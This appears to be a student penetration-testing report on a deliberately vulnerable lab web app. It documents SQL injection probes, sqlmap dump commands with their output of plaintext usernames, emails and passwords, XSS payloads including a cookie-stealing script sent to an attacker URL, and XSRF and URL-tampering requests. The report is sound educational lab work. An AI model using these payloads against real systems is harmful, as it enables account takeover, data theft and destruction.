====================WARNING====================
==Long step-by-step report, TL;DR near bottom==
=====contains vulnerabilities and exploits=====
===============================================

Here we did some tests for SQL injection. From entering some random values into
the username and password field we noticed that the vulnerable website would be
return blank if something in the backend returned a value (IE. valid/invalid login).
After noticing this, we tested a standard SQL injection input: 

 ==> something' and 'x'='x (into username field)
 --> The website returned a blank page
 
After this, we tested some valid SQL queries to find the column names in the
current SQL query.
 
 ==> x' AND userid is null; --
 --> Website returned an error! We can see from the error message that the 
     following query is used on the table: account. We also noticed that in the
	 SELECT statement, it has the column names of ...tName
	 (can't decypher right now) and passwd and from the WHERE statement, we saw
	 that another colmumn name is: username. 
	
Just after our second input, we were able to extract some key information about
the current database just from a simple error message that was returned to the 
user and onto the vulnerable website.

To confirm that these known column names are in the database, created a few queries. 

 ==> x' AND username is null; --
 ==> x' AND passwd is null; --
 ==> x' AND 1=(SELECT count (*) FROM account); --
 --> All of these queries caused the website to return a blank page. From our
     first SQL injection entry, we are able to confirm that these columns 
	 names existed in the account table. 
	 
 Now from here we did some trial and error to guess what ... tName was.
 
 ==> x' AND testName is null; --
 --> Error, nothing from this.
 
 ==> x' AND bestName is null; --
 --> Error again.
 
 ==> x' AND lastName is null; --
 --> Website returned a blank page! We concluded that this is another column
     name in the table account.
 
Some more trial and error with SQL injecting other queries to find some other
possible column names in the account table.

 ==> x' AND login is null; --
 ==> x' and acctName is null; --
 ==> x' AND email is null; --
 ==> x' AND loginid is null; --
 ==> x' AND address is null; --
 ==> x' AND userid is null; --
 --> All of these were errors and told us nothing. 
 
Finally, we thought of other common column names in an account database:

 ==> x' AND firstName is null; --
 --> Blank website again, concluding that this was another field in the account
	 table.
 
 ==> x' AND id is null; --
 --> Blank website again! Anther column name.
 
From all of these queries we are able to find out that:

 - The vulnerable website returns an error if something does not exist in the
   current database.
 - The vulnerable website returns a blank page with its empty fields when 
   valid/invalid input is taken.
 - The database has a table named: account
	- This account table has column names: 
	  firstName, lastName, id, username, and passwd

We try a couple SQL queries to see the website's behaviour:

 ==> x'; DROP TABLE account CASCADE; --
 --> Error. We notice that the vulnerable website uses a prepare statement to
     prevent users from trying to execute multiple SQL queries. 

 ==> x' OR 'x'='x (in both the username and password field)
 --> New page! We were able to get into the vulnerable website without knowing
     a valid username and password. BIG VULNERABILITY! This meant that an 
	 unauthorized user can access the website as another user. 

After this point, we enter and see the internals of the website by logging 
into the VM. Doing this helped us confirm that we had found all column names in
the account table. Scrolling down, we also see that the website also contains 
another table called: solution. This table has column names of expression, 
value, and accountId.
	 
 ==> x' OR EXISTS (SELECT * FROM solution WHERE value = 1); -- (only in username field)
 --> Entered the website. Very strange behaviour. 

After this point, instead of continuing to do trial and error, we decided to
explore other options to do the penetration testing. From researching, we 
found that SQLMap is exactly what we wanted. 

Typically, SQLMap does SQL injection through the URL of the website. Though in
this case, the URL is constantly always being redirected. So to combat this 
problem, we have to use the --forms arguement which allows this application
to perform the SQL injection queries into the text fields on the website 
(username and password field).

 ==> sqlmap --forms -u 192.168.17.132/fourFours/index.php --dump 
 --> Gets every single entry in every table
 ==> sqlmap --forms -u 192.168.17.132/fourFours/index.php --dbms 
 --> Gets the database language being used
 ==> sqlmap --forms -u 192.168.17.132/fourFours/index.php --columns 
 --> Gets every single column in every table
 
Using SQLMap allowed us to find out EVERYTHING about the website. Of course, 
we could have done this ourselves through trial and error but we just did not 
have the time to do this manually; having the SQLMap application allowed us to 
do exactly what we wanted.

Next, after logging into the fourFours application, we tried inputting xmp
tags into the fields to see if they are protected from other vulnerabilities. 
We noticed that it broke the HTML in the fourFours application! We now know 
that the website is XSS and XSFR vulnerable. From this, we are able to 
conclude that the website does not handle special characters in the field 
correctly. 

Knowing this, we were able to insert images, links, and javascript. 

=========================================================	 
========================= TL;DR =========================
=========================================================

Things we found out about the website through SQL injection via trial and error:

account (5): id, firstName, lastName, passwd, username
solutions (4): value, accountid, expression, id

Things we found out about the website through SQL injection via SQLMap:

web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: PostgreSQL

Database: public
Table: account
[15 entries]
+----+----------------+-----------------------+-------------+-----------+
| id | passwd         | username              | lastname    | firstname |
+----+----------------+-----------------------+-------------+-----------+
| 1  | sdfdsfd        | bigBoy                | Large       | Alex      |
| 2  | lion           | anne                  | Lion        | Anne      |
| 3  | fourfivesix    | lindah20              | Swim        | Linda     |
| 4  | silverisbetter | coins                 | Silver      | Abagail   |
| 5  | password1      | matchstick            | Burn        | Jessie    |
| 6  | password       | coffee                | Cup         | Annie     |
| 7  | passw0rd       | ssll                  | Bassell     | Diane     |
| 8  | cliff          | cliff                 | Mountain    | Steve     |
| 9  | sdxfdsgger     | arnold@cs.toronto.edu | Rosenbloom  | Arnold    |
| 10 | perl           | perl                  | Perlmuter   | Jay       |
| 11 | Peter          | pickApeck             | Piper       | Peter     |
| 12 | jbh            | hotel                 | Binghampton | Jen       |
| 13 | esrever        | dk@gmail.com          | Kleinman    | David     |
| 14 | badPassword    | eightball@gmail.com   | Kowalski    | Jesse     |
| 15 | grant          | ivanna                | Grant       | Ivanna    |
+----+----------------+-----------------------+-------------+-----------+

Database: public
Table: fourfoursuser
[15 entries]
+----+----------------------------+--------------+-------------------+-----------+
| id | email                      | lastname     | password          | firstname |
+----+----------------------------+--------------+-------------------+-----------+
| 1  | alex.grand@gmail.com       | Grand        | sjdfdsff          | Alexander |
| 2  | noemail@gmail.com          | Lion         | potato            | Anne      |
| 3  | linda.bay@gmail.com        | Bay          | one1Two2Three3    | Linda     |
| 4  | aaron.silver@gmail.com     | Silver       | ouattwtlp         | Aaron     |
| 5  | jess.burn@yahoo.com        | Burn         | password          | Jessica   |
| 6  | annie@cs.michigan.edu      | Satch        | government        | Annie     |
| 7  | caramel001@tdsb.on.gov     | Bassell      | passw0rd          | Dane      |
| 8  | sassk23@yahoo.com          | Kimbers      | sassk23@yahoo.com | Stephanie |
| 9  | arnold@cs.toronto.edu      | Rosenbloom   | qwertyasdfgh      | Arnold    |
| 10 | putter@starsupport.com     | Puter        | putter            | Joyce     |
| 11 | lindsay@lpeter.com         | Peter        | Peter             | Lidija    |
| 12 | japters@hp.com             | Ramachandran | jr                | Jennifer  |
| 13 | mariod@coke.ca             | Marius       | snoopy            | Davica    |
| 14 | eightball@poolsharks.com   | Kowalski     | badPassword       | Jesse     |
| 15 | ivanna.trump@microsoft.com | Grant        | m1ll10naire       | Ivanna    |
+----+----------------------------+--------------+-------------------+-----------+


===================================================
===================================================
===================================================

Vulnerabilies: 

1. SQL Injection

Exploits:

a. Access to the information in database.
	- Detect which DBMS is used (In this case POSTGRESQL)
	- Able to know the column names 
	- Able to know the tables in the database
	- Find all usernames
	- Find all passwords 
	- Find all first/last names
	- Find all emails
	- Find out all rows for each table/relation
	- All of this breaking confidentiality
	- Non hashed passwords

b. Unauthorized access to the website 
(x' OR 'x'='x [in username and password field as the query])
	- Able to enter and delete entries
	- Deny entry of that user
		- Breaks confidentiality
	
	
2. XSS

Exploits:

a. Able in input your own HTML code with the xmp tags
	- Breaks HTML and makes it so users cannot add or delete entries
	- Redirect user to keep going back one page in their history(never being able to access expression page)
		- Known as Denial Of Service

b. Add Javascript into text fields
	- Able to setup cookie then steal and protray ourselves as that user
	- Script that redirects user to malicious website
	- Put pictures into places only text should be allowed
	- Load images from other websites
	- Create loop to make page unaccessible
	- Close user browser/tab

	
Examples: 

Denial of Service
Constantly refreshes page:
</xmp><body onload="document.forms[0].submit()"><xmp>

Does not let user log in by continuously sending them to previous page:
<body onload="history.go(-1)">

Steal cookies from people who access the server:
</xmp><script language="javascript">url="hackers personal url"+document.cookie; document.location=url;</script><xmp>

Trick user into going to malicious website:
</xmp><a href="http://malicious website">Answers to expressions!</a><xmp>

Crash user browser:
</xmp><script language="javascript">for(var i=0;i<1000000000000000;i++)document.write(i+"\n");</script><xmp>

Load images from other websites:
</xmp><img src="website image link"><xmp>
	
3. XSRF

a. Able to make website do unwanted behaviours
	- Adding href'ed texts or img src into the database. Forcing the user
	  to do something they would not want to do
		- Have link/img src cause the user to logout
		- Have link/img src cause the user to enter an unwanted entry
		- Have link/img src cause the user to delete any/their own entry
		- Can add entries by another user
	- Adding a javascript into an entry in database
		- Javascript can do almost anything whether that be redirecting to 
		  another website, or stealing current user's information.
	
Examples:

Add entry as another user in the database: (adds value into entry 1)
Using image:
</xmp><img src="http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=addExpression&value=1&expression=1&accountId=6"><xmp>

Using link:
</xmp><a href="http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=addExpression&value=1&expression=1&accountId=6">Add to entry 1</a><xmp>

Delete all expressions in the database:
</xmp><img src="http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=deleteExpression&expressionId=id&accountId=accountId"><xmp>

Delete targets own entry:
</xmp><img src="http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=deleteExpression&expressionId=*&accountId=*"><xmp>

Trick user into logging out by clicking on link:
</xmp><a href="http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=logout"></a><xmp>

4) Broken Authentication and Session Management

Exploits:
a) URL rewrite inorder to impersonate other accounts
	-Able to add expressions as any user through expossed URL
	-Able to delete expressions from the table as any user via URL

Examples:
Adding expressions as any user
http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=addExpression&value="ANY VALUE"&expression=1&accountId="any USERID"

Deleting expressions as any user
http://[YOUR_IP_ADDRESS]/fourFours/index.php?operation=deleteExpression&expressionId="expression id"&accountId="id of user that made entry"

5) Sensitive Data Exposure
-No passwords are hashed so after an sql injection to extract all tables, the passwords are easily recoverable
	